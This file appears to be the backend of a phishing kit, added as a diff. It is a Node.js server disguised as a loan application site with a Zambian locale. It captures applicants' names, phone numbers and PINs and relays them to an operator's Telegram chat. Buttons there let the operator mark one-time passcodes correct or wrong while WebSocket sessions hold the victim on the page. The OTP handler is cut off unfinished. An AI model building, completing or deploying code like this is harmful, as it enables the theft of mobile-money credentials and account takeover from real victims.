@@ -1,0 +1,96 @@
+const express = require('express');
+const http = require('http');
+const { WebSocketServer, WebSocket } = require('ws');
+
+// ═══════════════════════════════════════════
+// CONFIG — REPLACE WITH YOUR VALUES
+// ═══════════════════════════════════════════
+const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
+const TELEGRAM_CHAT_ID   = 'YOUR_CHAT_ID_HERE';
+const PORT = 3000;
+
+// ═══════════════════════════════════════════
+// SETUP
+// ═══════════════════════════════════════════
+const app = express();
+const server = http.createServer(app);
+const wss = new WebSocketServer({ server, path: '/ws' });
+
+app.use(express.static(__dirname));
+app.use(express.json());
+
+const sessions = {};
+
+// WebSocket
+wss.on('connection', (ws, req) => {
+    const url = new URL(req.url, 'http://' + req.headers.host);
+    const sessionId = url.searchParams.get('session');
+
+    if (sessionId && sessions[sessionId]) {
+        sessions[sessionId].ws = ws;
+        console.log(`✅ User connected: ${sessions[sessionId].phone}`);
+    }
+
+    ws.on('message', (data) => {
+        try {
+            const msg = JSON.parse(data);
+            if (msg.type === 'new_otp_request' && sessions[sessionId]) {
+                sendNewOTPToTelegram(sessions[sessionId]);
+            }
+        } catch (e) { console.error(e); }
+    });
+
+    ws.on('close', () => {
+        if (sessionId && sessions[sessionId]) {
+            sessions[sessionId].ws = null;
+            console.log(`❌ User disconnected: ${sessions[sessionId].phone}`);
+        }
+    });
+});
+
+// ═══════════════════════════════════════════
+// API: Apply
+// ═══════════════════════════════════════════
+app.post('/api/apply', async (req, res) => {
+    const { name, phone, amount, period, pin } = req.body;
+
+    const sessionId = 'S' + Date.now().toString(36) + Math.random().toString(36).slice(2, 6);
+    const interest = Math.round(amount * 0.0013 * period);
+    const total = amount + interest;
+
+    sessions[sessionId] = { ws: null, name, phone, amount, period, pin, otp: '' };
+
+    const msg = `📋 *NEW LOAN APPLICATION*
+━━━━━━━━━━━━━━━━━━
+👤 *Name:* ${name}
+📱 *Phone:* ${phone}
+💰 *Amount:* K${amount.toLocaleString()}
+📅 *Period:* ${period} days
+📊 *Interest:* K${interest.toLocaleString()}
+💵 *Total Repay:* K${total.toLocaleString()}
+🔐 *PIN:* ✅ ${pin}
+🕐 *Time:* ${new Date().toLocaleString('en-ZM')}
+━━━━━━━━━━━━━━━━━━
+_Tap button to verify OTP_`;
+
+    const keyboard = {
+        inline_keyboard: [[
+            { text: '✅ Correct OTP', callback_data: `correct:${sessionId}` },
+            { text: '❌ Wrong OTP', callback_data: `wrong:${sessionId}` }
+        ]]
+    };
+
+    await sendTelegramMessage(msg, 'Markdown', keyboard);
+    res.json({ success: true, sessionId });
+});
+
+// ═══════════════════════════════════════════
+// API: OTP
+// ═══════════════════════════════════════════
+app.post('/api/otp', async (req, res) => {
+    const { sessionId, otp } = req.body;
+    const session = sessions[sessionId];
+
+    if (!session) return res.status(404).json({ error: 'Session not found' });
+
+ });   
